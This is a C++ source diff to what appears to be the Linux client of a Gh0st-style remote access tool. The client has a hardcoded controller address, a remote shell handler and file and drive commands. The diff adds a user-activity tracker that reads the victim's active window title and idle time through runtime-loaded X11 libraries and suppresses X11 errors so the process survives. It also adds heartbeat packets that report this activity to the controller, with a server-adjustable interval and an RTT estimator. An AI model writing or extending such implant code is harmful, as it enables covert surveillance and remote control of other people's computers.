@@ -22,6 +22,7 @@
 #include <regex>
 #include <fstream>
 #include <map>
+#include <cmath>
 #include "ScreenHandler.h"
 #include "SystemManager.h"
 #include "FileManager.h"
@@ -112,6 +113,284 @@ CONNECT_ADDRESS g_SETTINGS = { FLAG_GHOST, "192.168.0.55", "6543", CLIENT_TYPE_L
 
 // 全局状态
 State g_bExit = S_CLIENT_NORMAL;
+
+// ============== UTF-8 → GBK 编码转换（服务端为 Windows GBK 环境） ==============
+
+static std::string utf8ToGbk(const std::string& utf8)
+{
+    if (utf8.empty()) return utf8;
+    iconv_t cd = iconv_open("GBK", "UTF-8");
+    if (cd == (iconv_t)-1) return utf8;
+
+    size_t inLeft = utf8.size();
+    size_t outLeft = inLeft * 2; // GBK 最多 2 字节/字符，不会比 UTF-8 更长
+    std::string output(outLeft, '\0');
+
+    char* inPtr  = const_cast<char*>(utf8.data());
+    char* outPtr = &output[0];
+
+    size_t ret = iconv(cd, &inPtr, &inLeft, &outPtr, &outLeft);
+    iconv_close(cd);
+
+    if (ret == (size_t)-1) return utf8; // 转换失败，原样返回
+    output.resize(output.size() - outLeft);
+    return output;
+}
+
+// ============== 用户活动检测（对应 Windows 端 ActivityWindow） ==============
+
+// X11 额外类型定义（ScreenHandler.h 的前向声明未包含这些）
+#ifndef _X11_ATOM_DEFINED
+#define _X11_ATOM_DEFINED
+typedef unsigned long Atom;
+typedef int Bool_X;   // 避免与 commands.h 中的 BOOL 冲突
+typedef int Status_X;
+#endif
+
+// XScreenSaver 扩展的 Info 结构体（避免 #include <X11/extensions/scrnsaver.h>）
+struct XScreenSaverInfo_LNX {
+    Window      window;
+    int         state;
+    int         kind;
+    unsigned long til_or_since;
+    unsigned long idle;         // 用户空闲毫秒数
+    unsigned long eventMask;
+};
+
+class ActivityChecker
+{
+public:
+    ActivityChecker() : m_x11(nullptr), m_xss(nullptr), m_display(nullptr), m_available(false)
+    {
+        // 加载 libX11
+        m_x11 = dlopen("libX11.so.6", RTLD_LAZY);
+        if (!m_x11) m_x11 = dlopen("libX11.so", RTLD_LAZY);
+        if (!m_x11) return;
+
+        // 解析 X11 函数
+        pXOpenDisplay       = (fn_XOpenDisplay)dlsym(m_x11, "XOpenDisplay");
+        pXCloseDisplay      = (fn_XCloseDisplay)dlsym(m_x11, "XCloseDisplay");
+        pXDefaultScreen     = (fn_XDefaultScreen)dlsym(m_x11, "XDefaultScreen");
+        pXRootWindow        = (fn_XRootWindow)dlsym(m_x11, "XRootWindow");
+        pXInternAtom        = (fn_XInternAtom)dlsym(m_x11, "XInternAtom");
+        pXGetWindowProperty = (fn_XGetWindowProperty)dlsym(m_x11, "XGetWindowProperty");
+        pXFree              = (fn_XFree)dlsym(m_x11, "XFree");
+        pXSetErrorHandler   = (fn_XSetErrorHandler)dlsym(m_x11, "XSetErrorHandler");
+
+        if (!pXOpenDisplay || !pXCloseDisplay || !pXDefaultScreen || !pXRootWindow ||
+            !pXInternAtom || !pXGetWindowProperty || !pXFree)
+            return;
+
+        // 打开 Display 连接
+        m_display = pXOpenDisplay(nullptr);
+        if (!m_display) return;
+
+        // 静默 X11 错误，防止程序被杀
+        if (pXSetErrorHandler)
+            pXSetErrorHandler((int(*)(Display*, void*))silentErrorHandler);
+
+        // 预查询常用 Atom
+        m_atomActiveWindow = pXInternAtom(m_display, "_NET_ACTIVE_WINDOW", 0);
+        m_atomWmName       = pXInternAtom(m_display, "_NET_WM_NAME", 0);
+        m_atomUtf8String   = pXInternAtom(m_display, "UTF8_STRING", 0);
+        m_atomWmNameLegacy = pXInternAtom(m_display, "WM_NAME", 0);
+
+        m_screen = pXDefaultScreen(m_display);
+        m_root   = pXRootWindow(m_display, m_screen);
+
+        // 加载 libXss（可选，没有则无法获取空闲时间）
+        m_xss = dlopen("libXss.so.1", RTLD_LAZY);
+        if (!m_xss) m_xss = dlopen("libXss.so", RTLD_LAZY);
+        if (m_xss) {
+            pXScreenSaverAllocInfo = (fn_XScreenSaverAllocInfo)dlsym(m_xss, "XScreenSaverAllocInfo");
+            pXScreenSaverQueryInfo = (fn_XScreenSaverQueryInfo)dlsym(m_xss, "XScreenSaverQueryInfo");
+        }
+
+        m_available = true;
+    }
+
+    ~ActivityChecker()
+    {
+        if (m_display && pXCloseDisplay) pXCloseDisplay(m_display);
+        if (m_xss) dlclose(m_xss);
+        if (m_x11) dlclose(m_x11);
+    }
+
+    // 主入口：返回用户活动描述字符串（与 Windows 端 ActivityWindow::Check 对齐）
+    std::string Check(unsigned long threshold_ms = 6000)
+    {
+        if (!m_available) return "";
+
+        unsigned long idle = GetIdleTime();
+
+        if (idle < threshold_ms) {
+            return GetActiveWindowTitle();
+        }
+        return "Inactive: " + FormatMilliseconds(idle);
+    }
+
+private:
+    // X11 函数指针类型
+    typedef Display*    (*fn_XOpenDisplay)(const char*);
+    typedef int         (*fn_XCloseDisplay)(Display*);
+    typedef int         (*fn_XDefaultScreen)(Display*);
+    typedef Window      (*fn_XRootWindow)(Display*, int);
+    typedef Atom        (*fn_XInternAtom)(Display*, const char*, int);
+    typedef int         (*fn_XGetWindowProperty)(Display*, Window, Atom, long, long, int,
+                            Atom, Atom*, int*, unsigned long*, unsigned long*, unsigned char**);
+    typedef int         (*fn_XFree)(void*);
+    typedef int         (*fn_XSetErrorHandler)(int(*)(Display*, void*));
+
+    // XScreenSaver 函数指针类型
+    typedef XScreenSaverInfo_LNX* (*fn_XScreenSaverAllocInfo)();
+    typedef Status_X (*fn_XScreenSaverQueryInfo)(Display*, Drawable, XScreenSaverInfo_LNX*);
+
+    // 函数指针实例
+    fn_XOpenDisplay       pXOpenDisplay       = nullptr;
+    fn_XCloseDisplay      pXCloseDisplay      = nullptr;
+    fn_XDefaultScreen     pXDefaultScreen     = nullptr;
+    fn_XRootWindow        pXRootWindow        = nullptr;
+    fn_XInternAtom        pXInternAtom        = nullptr;
+    fn_XGetWindowProperty pXGetWindowProperty = nullptr;
+    fn_XFree              pXFree              = nullptr;
+    fn_XSetErrorHandler   pXSetErrorHandler   = nullptr;
+
+    fn_XScreenSaverAllocInfo pXScreenSaverAllocInfo = nullptr;
+    fn_XScreenSaverQueryInfo pXScreenSaverQueryInfo = nullptr;
+
+    void*   m_x11;
+    void*   m_xss;
+    Display* m_display;
+    bool    m_available;
+
+    int     m_screen;
+    Window  m_root;
+    Atom    m_atomActiveWindow;
+    Atom    m_atomWmName;
+    Atom    m_atomUtf8String;
+    Atom    m_atomWmNameLegacy;
+
+    static int silentErrorHandler(Display*, void*) { return 0; }
+
+    // 获取用户空闲时间（毫秒），libXss 不可用时返回 0
+    unsigned long GetIdleTime()
+    {
+        if (!pXScreenSaverAllocInfo || !pXScreenSaverQueryInfo)
+            return 0;
+
+        XScreenSaverInfo_LNX* info = pXScreenSaverAllocInfo();
+        if (!info) return 0;
+
+        unsigned long idle = 0;
+        if (pXScreenSaverQueryInfo(m_display, m_root, info))
+            idle = info->idle;
+
+        pXFree(info);
+        return idle;
+    }
+
+    // 获取当前活动窗口标题（通过 EWMH _NET_ACTIVE_WINDOW + _NET_WM_NAME）
+    std::string GetActiveWindowTitle()
+    {
+        // 第一步：从根窗口读取 _NET_ACTIVE_WINDOW 得到活动窗口 ID
+        Atom actualType = 0;
+        int actualFormat = 0;
+        unsigned long nItems = 0, bytesAfter = 0;
+        unsigned char* prop = nullptr;
+
+        int ret = pXGetWindowProperty(m_display, m_root, m_atomActiveWindow,
+                                      0, 1, 0, (Atom)0 /* AnyPropertyType */,
+                                      &actualType, &actualFormat, &nItems, &bytesAfter, &prop);
+        if (ret != 0 || !prop || nItems == 0) {
+            if (prop) pXFree(prop);
+            return "";
+        }
+
+        Window activeWin = *(Window*)prop;
+        pXFree(prop);
+        prop = nullptr;
+
+        if (activeWin == 0) return "";
+
+        // 第二步：读取 _NET_WM_NAME (UTF-8)，失败则回退 WM_NAME
+        std::string title = GetWindowProperty(activeWin, m_atomWmName, m_atomUtf8String);
+        if (title.empty())
+            title = GetWindowProperty(activeWin, m_atomWmNameLegacy, (Atom)0);
+
+        return title;
+    }
+
+    // 通用窗口属性读取
+    std::string GetWindowProperty(Window win, Atom property, Atom reqType)
+    {
+        Atom actualType = 0;
+        int actualFormat = 0;
+        unsigned long nItems = 0, bytesAfter = 0;
+        unsigned char* prop = nullptr;
+
+        int ret = pXGetWindowProperty(m_display, win, property,
+                                      0, 512, 0, reqType,
+                                      &actualType, &actualFormat, &nItems, &bytesAfter, &prop);
+        if (ret != 0 || !prop || nItems == 0) {
+            if (prop) pXFree(prop);
+            return "";
+        }
+
+        std::string result((char*)prop, nItems);
+        pXFree(prop);
+        return result;
+    }
+
+    static std::string FormatMilliseconds(unsigned long ms)
+    {
+        unsigned long totalSeconds = ms / 1000;
+        unsigned long hours   = totalSeconds / 3600;
+        unsigned long minutes = (totalSeconds % 3600) / 60;
+        unsigned long seconds = totalSeconds % 60;
+
+        char buf[16];
+        sprintf(buf, "%02lu:%02lu:%02lu", hours, minutes, seconds);
+        return buf;
+    }
+};
+
+// ============== 心跳保活 & RTT 估算 ==============
+
+// RTT 估算器（参考 RFC 6298 算法，与 Windows 端 KernelManager 一致）
+struct RttEstimator {
+    double srtt = 0.0;       // 平滑 RTT (秒)
+    double rttvar = 0.0;     // RTT 波动 (秒)
+    double rto = 0.0;        // 超时时间 (秒)
+    bool initialized = false;
+
+    void update_from_sample(double rtt_ms)
+    {
+        // 过滤异常值：RTT应在合理范围内 (0, 30000] 毫秒
+        if (rtt_ms <= 0 || rtt_ms > 30000)
+            return;
+
+        const double alpha = 1.0 / 8;
+        const double beta = 1.0 / 4;
+        double rtt = rtt_ms / 1000.0;
+
+        if (!initialized) {
+            srtt = rtt;
+            rttvar = rtt / 2.0;
+            rto = srtt + 4.0 * rttvar;
+            initialized = true;
+        } else {
+            rttvar = (1.0 - beta) * rttvar + beta * std::fabs(srtt - rtt);
+            srtt = (1.0 - alpha) * srtt + alpha * rtt;
+            rto = srtt + 4.0 * rttvar;
+        }
+
+        // 限制最小 RTO（RFC 6298 推荐 1 秒）
+        if (rto < 1.0) rto = 1.0;
+    }
+};
+
+RttEstimator g_rttEstimator;
+int g_heartbeatInterval = 5; // 默认心跳间隔（秒），可被服务端 CMD_MASTERSETTING 更新
 
 // 伪终端处理类：继承自IOCPManager.
 class PTYHandler : public IOCPManager
@@ -345,6 +624,26 @@ int DataProcess(void* user, PBYTE szBuffer, ULONG ulLength)
     else if (szBuffer[0] == COMMAND_LIST_DRIVE) {
         std::thread(FileManagerThread, nullptr).detach();
         Mprintf("** [%p] Received 'LIST_DRIVE' command ***\n", user);
+    }
+    else if (szBuffer[0] == CMD_HEARTBEAT_ACK) {
+        if (ulLength >= 1 + sizeof(HeartbeatACK)) {
+            HeartbeatACK* ack = (HeartbeatACK*)(szBuffer + 1);
+            uint64_t now = GetUnixMs();
+            double rtt_ms = (double)(now - ack->Time);
+            g_rttEstimator.update_from_sample(rtt_ms);
+            Mprintf("** [%p] Heartbeat ACK: RTT=%.1fms, SRTT=%.1fms ***\n",
+                    user, rtt_ms, g_rttEstimator.srtt * 1000);
+        }
+    }
+    else if (szBuffer[0] == CMD_MASTERSETTING) {
+        int settingSize = ulLength - 1;
+        if (settingSize >= (int)sizeof(int)) { // 至少包含 ReportInterval
+            MasterSettings settings = {};
+            memcpy(&settings, szBuffer + 1, settingSize < (int)sizeof(MasterSettings) ? settingSize : sizeof(MasterSettings));
+            if (settings.ReportInterval > 0)
+                g_heartbeatInterval = settings.ReportInterval;
+            Mprintf("** [%p] MasterSettings: ReportInterval=%ds ***\n", user, g_heartbeatInterval);
+        }
     }
     else if (szBuffer[0] == COMMAND_NEXT) {
         Mprintf("** [%p] Received 'NEXT' command ***\n", user);
@@ -784,6 +1083,9 @@ int main(int argc, char* argv[])
     logInfo.AddReserved((int)getpid());                               // [17] RES_PID
     logInfo.AddReserved(getFileSize(exePath).c_str());                // [18] RES_FILESIZE
 
+    // 初始化用户活动检测器（用于心跳包中的 ActiveWnd 字段）
+    ActivityChecker activityChecker;
+
     std::unique_ptr<IOCPClient> ClientObject(new IOCPClient(g_bExit, false));
     ClientObject->setManagerCallBack(NULL, DataProcess, NULL);
     while (!g_bExit) {
@@ -795,9 +1097,33 @@ int main(int argc, char* argv[])
 
         ClientObject->SendLoginInfo(logInfo.Speed(clock() - c));
 
-        do {
-            Sleep(5000);
-        } while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit);
+        // 心跳保活循环：定时发送心跳包，服务端回复后动态更新 RTT
+        while (ClientObject->IsRunning() && ClientObject->IsConnected() && S_CLIENT_NORMAL == g_bExit) {
+            // 等待心跳间隔（每秒检查一次退出条件，保证及时响应）
+            int interval = g_heartbeatInterval > 0 ? g_heartbeatInterval : 30;
+            for (int i = 0; i < interval; ++i) {
+                if (!ClientObject->IsRunning() || !ClientObject->IsConnected() || g_bExit != S_CLIENT_NORMAL)
+                    break;
+                Sleep(1000);
+            }
+            if (!ClientObject->IsRunning() || !ClientObject->IsConnected() || g_bExit != S_CLIENT_NORMAL)
+                break;
+
+            // 构造并发送心跳包（与 Windows 端 KernelManager::SendHeartbeat 格式一致）
+            std::string activity = utf8ToGbk(activityChecker.Check());
+
+            Heartbeat hb;
+            hb.Time = GetUnixMs();
+            hb.Ping = (int)(g_rttEstimator.srtt * 1000); // srtt 是秒，转为毫秒
+            strncpy(hb.ActiveWnd, activity.c_str(), sizeof(hb.ActiveWnd) - 1);
+
+            BYTE buf[sizeof(Heartbeat) + 1];
+            buf[0] = TOKEN_HEARTBEAT;
+            memcpy(buf + 1, &hb, sizeof(Heartbeat));
+            ClientObject->Send2Server((char*)buf, sizeof(buf));
+            Mprintf(">>> Heartbeat sent: Ping=%dms, Interval=%ds, Activity=%s\n",
+                    hb.Ping, interval, activity.c_str());
+        }
     }
 
     Logger::getInstance().stop();
